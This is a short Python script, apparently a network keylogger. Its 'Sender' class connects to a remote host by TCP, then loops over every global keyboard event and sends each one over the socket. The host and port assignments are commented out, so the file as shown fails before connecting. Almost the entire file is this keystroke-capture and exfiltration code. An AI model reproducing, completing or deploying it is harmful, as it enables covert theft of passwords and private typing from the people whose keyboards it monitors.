import socket
import threading
import keyboard

class Sender:
    def __init__(self):
        self.connection()
        
    def connection(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        #self.ip = input("IP: ")
        #self.port = input("PORT: ")
        
        #self.ip = socket.gethostname()
        #self.port = 2222
        
        self.s.connect((self.ip, self.port))
        
        self.username = 'sender'
        self.s.send(self.username.encode())
        
        print(f"u da {self.username}")
        
        input_handler = threading.Thread(target=self.input_handler,args=())
        input_handler.start()
        
    def input_handler(self):
        while True:
            encode = str(keyboard.read_event(suppress=False)).encode()
            self.s.send(encode)
            
client = Sender()